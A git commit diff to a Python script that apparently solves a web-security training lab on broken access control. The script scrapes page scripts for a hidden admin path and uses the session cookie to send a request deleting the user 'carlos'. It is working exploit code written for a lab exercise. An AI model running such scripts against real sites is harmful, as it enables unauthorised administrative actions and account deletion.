1ecf8280f2fd6770feff24bf1c64756f79df66e4
Heath Stewart <heath.stewart1@gmail.com>
2023-06-06 11:08:53 -0400

    updated ac2 to use session cookie

--- access-control/ac-lab-02.py
+++ access-control/ac-lab-02.py
@@ -2,6 +2,7 @@
 
 import requests
 import sys
+from requests import cookies
 import urllib3
 from bs4 import BeautifulSoup as bs
 
@@ -13,11 +14,17 @@ proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
 
 # function to find all script tags in the page (we know from solving the lab)
 def find_scripts(url):
-    response_txt = requests.get(url, verify=False).text
-    data = bs(response_txt, "html.parser")
+
+    # to complete this lab we need a session cookie
+    session = requests.session()
+    response = session.get(url, verify=False)
+    cookies = requests.utils.dict_from_cookiejar(response.cookies)
+    data = bs(response.text, "html.parser")
     scripts = data.find_all('script')
 
     # loop through scripts and find the isAdmin variable
+    # the 're' library would be better for this, but for a simple lab this works
+    # .... but seriously, I should have used 're'
     for s in scripts:
         if 'var isAdmin' in s.text:
             # print(s.text)
@@ -28,15 +35,16 @@ def find_scripts(url):
             # bunch of non-sense to format the endpoint correctly and craft the final admin url
             admin_url = url + admin_endpoint.strip('\'')
 
-            delete_carlos(admin_url)
+            delete_carlos(admin_url, session, cookies)
 
 
-def delete_carlos(url):
+# we'll take in the session and cookie as additional params for this function so we don't have to repeat ourselves
+def delete_carlos(url, session, cookies):
     # GET /admin-zz5o4u/delete?username=carlos
     delete_url = url + '/delete?username=carlos'
 
     # send get request to delete carlos
-    response = requests.get(delete_url, verify=False, proxies=proxies)
+    response = session.get(delete_url, verify=False, proxies=proxies, cookies=cookies)
     # print(delete_url)  # sanity check
 
     if response.status_code == 200:
